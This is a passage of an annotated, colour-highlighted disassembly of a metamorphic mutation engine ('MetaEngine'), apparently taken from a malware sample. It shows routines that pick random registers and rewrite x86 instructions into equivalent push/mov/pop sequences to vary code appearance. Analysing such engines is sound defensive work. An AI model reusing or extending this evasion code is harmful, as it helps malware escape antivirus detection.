</span>                <span style="COLOR: #c0c0c0">cmp     ecx</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                    <span style="COLOR: white">; check sign of imm32
</span>                <span style="COLOR: #c0c0c0">js      short </span><span style="COLOR: #ffff00">GenSubRandomReg32</span>
                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">7FFh</span>                 <span style="COLOR: white">; set it between 0 - 77F
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">sub     ecx</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; ecx -= random
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">GenOpRegRandomReg32</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">GenSubRandomReg32</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+66Bj
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">101000b</span>               <span style="COLOR: white">; set [reg/opcode] field = 101 (SUB)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     eax</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">77Fh</span>                 <span style="COLOR: white">; set it between 0 - 77F
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">add     ecx</span><span style="COLOR: #c0c0c0">, eax</span>                  <span style="COLOR: white">; ecx += random
</span>
<span style="COLOR: #ffff00">GenOpRegRandomReg32</span><span style="COLOR: #c0c0c0">:                              </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+67Bj
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; copy original opcode byte
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111000b</span>             <span style="COLOR: white">; clear the [reg] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; add random reg
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, ecx</span>                  <span style="COLOR: white">; eax = random dword
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                    <span style="COLOR: white">; incrase code pointer by 4
</span>
<span style="COLOR: #ffff00">GenPopRandomReg</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+65Cj
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; al = random register
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">58h</span>                   <span style="COLOR: white">; Generate POP RandomReg
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; END OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; dl = *esi &amp; 1
</span>
<span style="COLOR: #ffff00">GetWBit         proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+600p
</span>                                                  <span style="COLOR: #00ff00">; GetRandomReg8p
</span>                <span style="COLOR: #c0c0c0">mov     dl</span><span style="COLOR: #c0c0c0">, [esi]</span>
                <span style="COLOR: #c0c0c0">and     dl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>
<span style="COLOR: #ffff00">GetWBit         endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; returns: dh(w=1)=FB; dh(w=0)=FF;
</span>
<span style="COLOR: #ffff00">ModifyDh        proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+7BCp
</span>                <span style="COLOR: #c0c0c0">mov     dh</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; dh = w bit
</span>                <span style="COLOR: #c0c0c0">xor     dh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; inverse
</span>                <span style="COLOR: #c0c0c0">rol     dh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>
                <span style="COLOR: #c0c0c0">xor     dh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111111b</span>
                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">ModifyDh        endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>
<span style="COLOR: white">; returns: bl = random reg value (0-7)
</span>
<span style="COLOR: #ffff00">GetRandomReg8   proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+733p
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+77Ap ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetWBit</span>                   <span style="COLOR: #c0c0c0">; dl = *esi &amp; 1
</span>                <span style="COLOR: #c0c0c0">cmp     dl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; is it 8bit?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">GetRandomReg32</span>      <span style="COLOR: white">; no, go to the 32bit version
</span>
<span style="COLOR: #ffff00">GetReg8</span><span style="COLOR: #c0c0c0">:                                          </span><span style="COLOR: #00ff00">; CODE XREF: GetRandomReg8+24j
</span>                                                  <span style="COLOR: #00ff00">; GetRandomReg8+38j
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; make it bwtween 0-7
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; cl = random number
</span>                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">mov     ch</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ch = ModRM
</span>                <span style="COLOR: #c0c0c0">cmp     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>
                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">CheckReg8</span>
                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, dh</span>

<span style="COLOR: #ffff00">CheckReg8</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: GetRandomReg8+1Bj
</span>                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; keep the last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, ch</span>                    <span style="COLOR: white">; the same register?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetReg8</span>             <span style="COLOR: white">; get another one
</span>                <span style="COLOR: #c0c0c0">cmp     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">ret_RandomReg8</span>
                <span style="COLOR: #c0c0c0">mov     ch</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ch = ModRM
</span>                <span style="COLOR: #c0c0c0">ror     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; check the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>
                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, ch</span>                    <span style="COLOR: white">; the same register?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetReg8</span>             <span style="COLOR: white">; get another one
</span>
<span style="COLOR: #ffff00">ret_RandomReg8</span><span style="COLOR: #c0c0c0">:                                   </span><span style="COLOR: #00ff00">; CODE XREF: GetRandomReg8+29j
</span>                <span style="COLOR: #c0c0c0">mov     bl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; bl = random register
</span>                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">GetRandomReg8   endp
</span>

<span style="COLOR: #c0c0c0">; _______________ S U B R O U T I N E _______________________________________
</span>

<span style="COLOR: #ffff00">GetRandomReg32  proc near                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+605p
</span>                                                  <span style="COLOR: #00ff00">; GetRandomReg8+8j ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; make it between 0-7 (a register)
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">4</span>                     <span style="COLOR: white">; ESP?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetRandomReg32</span>      <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">5</span>                     <span style="COLOR: white">; EBP?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetRandomReg32</span>      <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; cl = random reg
</span>                <span style="COLOR: #c0c0c0">mov     ch</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ch = ModRM
</span>                <span style="COLOR: #c0c0c0">cmp     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>
                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: white">loc_40270A</span>
                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, dh</span>

<span style="COLOR: white">loc_40270A</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: GetRandomReg32+17j
</span>                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; keep last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, ch</span>                    <span style="COLOR: white">; is the [reg] field in ModRM == random reg?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetRandomReg32</span>      <span style="COLOR: white">; yes, choose another register
</span>                <span style="COLOR: #c0c0c0">cmp     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; if (flag) == false
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">ret_RandomReg32</span>
                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; cl = random reg
</span>                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">mov     ch</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ch = ModRM
</span>                <span style="COLOR: #c0c0c0">ror     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>
                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; keep last 3 bits
</span>                <span style="COLOR: #c0c0c0">and     ch</span><span style="COLOR: #c0c0c0">, dh</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, ch</span>
                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">GetRandomReg32</span>

<span style="COLOR: #ffff00">ret_RandomReg32</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: GetRandomReg32+27j
</span>                <span style="COLOR: #c0c0c0">mov     bl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; bl = random reg
</span>                <span style="COLOR: #c0c0c0">retn
</span><span style="COLOR: #ffff00">GetRandomReg32  endp
</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span><span style="COLOR: #c0c0c0">; START OF FUNCTION CHUNK FOR MetaEngine
</span>
<span style="COLOR: #ffff00">Morph2</span><span style="COLOR: #c0c0c0">:                                           </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine:jmp_Mutatej
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomReg8</span>             <span style="COLOR: #c0c0c0">; returns: bl = random reg value (0-7)
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePushRandomReg</span>         <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 50h
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Ah</span>                   <span style="COLOR: white">; Generate MOV r8,r/m8
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; dl = w bit
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store (8A or 8B)
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; save the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">ror     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; move first reg to the [reg] field
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; ah = random reg
</span>                <span style="COLOR: #c0c0c0">rol     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; move random reg ro the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; add it
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = original opcode
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000111b</span>             <span style="COLOR: white">; save [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; ah = random reg
</span>                <span style="COLOR: #c0c0c0">rol     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; save random reg in the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; add random reg to ModRM
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code pointer by 2
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; copy displacement
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePopRandomReg</span>          <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 58h
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">Morph3</span><span style="COLOR: #c0c0c0">:                                           </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine:_jmp_Mutatej
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomReg8</span>             <span style="COLOR: #c0c0c0">; returns: bl = random reg value (0-7)
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePushRandomReg</span>         <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 50h
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = opcode
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111110b</span>             <span style="COLOR: white">; clear w bit
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Ah</span>                   <span style="COLOR: white">; MOV r8, r/m8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Morph3_Continue</span>     <span style="COLOR: white">; jump to 8 bit version
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">88h</span>                   <span style="COLOR: white">; Generate MOV r32, r/m32
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; add the w bit
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; clear the [reg] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; add random register
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>
<span style="COLOR: #ffff00">Morph3_Continue</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+78Aj
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi]</span>                 <span style="COLOR: white">; al = original opcode
</span>                <span style="COLOR: #c0c0c0">mov     dh</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; dh = original opcode
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000111b</span>             <span style="COLOR: white">; clear [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; ah = random register
</span>                <span style="COLOR: #c0c0c0">rol     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; place it in the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, ah</span>                    <span style="COLOR: white">; add to ModRM
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">mov     bh</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; bh = original ModRM
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code counter by 2
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; copy displacement
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, dh</span>                    <span style="COLOR: white">; al = opcode
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">ModifyDh</span>                  <span style="COLOR: #c0c0c0">; returns: dh(w=1)=FB; dh(w=0)=FF;
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11111110b</span>             <span style="COLOR: white">; clear w bit
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3Ah</span>                   <span style="COLOR: white">; CMP r8, r/m8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Wrap_Morph3</span>
                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Ah</span>                   <span style="COLOR: white">; al = MOV r8, r/m8, direction flag set
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; add the w bit
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store opcode
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bh</span>                    <span style="COLOR: white">; al = original ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; clear the [reg] field
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; add random register
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; set [mod] = 11
</span>                <span style="COLOR: #c0c0c0">stosb
</span>
<span style="COLOR: #ffff00">Wrap_Morph3</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+7C5j
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePopRandomReg</span>          <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 58h
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">Morph4</span><span style="COLOR: #c0c0c0">:                                           </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine:__jmp_Mutatej
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">GetRandomReg8</span>             <span style="COLOR: #c0c0c0">; returns: bl = random reg value (0-7)
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">MakePushRandomReg</span>         <span style="COLOR: #c0c0c0">; store (bl &amp; dh) + 50h
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; al = w bit
</span>                <span style="COLOR: #c0c0c0">rol     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; move the w bit 3 bits left
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B0h</span>                  <span style="COLOR: white">; Generate MOV r8/32, imm8/32
</span>                                                  <span style="COLOR: white">; B0 = 1011 w reg
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, bl</span>                    <span style="COLOR: white">; add random register
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     ecx</span><span style="COLOR: #c0c0c0">, esi</span>                  <span style="COLOR: white">; add location+displacement
</span>                <span style="COLOR: #c0c0c0">mov     eax</span><span style="COLOR: #c0c0c0">, [ecx+</span><span style="COLOR: #00ffff">2</span><span style="COLOR: #c0c0c0">]</span>              <span style="COLOR: white">; eax = original immediate
</span>                <span style="COLOR: #c0c0c0">cmp     dl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; check the w bit
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">StoreOneByte</span>        <span style="COLOR: #c0c0c0">; store one byte
</span>                <span style="COLOR: #c0c0c0">stosd                             </span><span style="COLOR: white">; store dword
</span>                <span style="COLOR: #c0c0c0">jmp     short </span><span style="COLOR: #ffff00">Morph4_Continue</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">StoreOneByte</span><span style="COLOR: #c0c0c0">:                                     </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+800j
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store one byte
</span>
<span style="COLOR: #ffff00">Morph4_Continue</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+803j
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, bh</span>                    <span style="COLOR: white">; bh = opcode saved before call to this routine
</span>                <span style="COLOR: #c0c0c0">add     al</span><span style="COLOR: #c0c0c0">, dl</span>                    <span style="COLOR: white">; add the w bit
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = original ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000111b</span>             <span style="COLOR: white">; clear the [reg/opcode] field
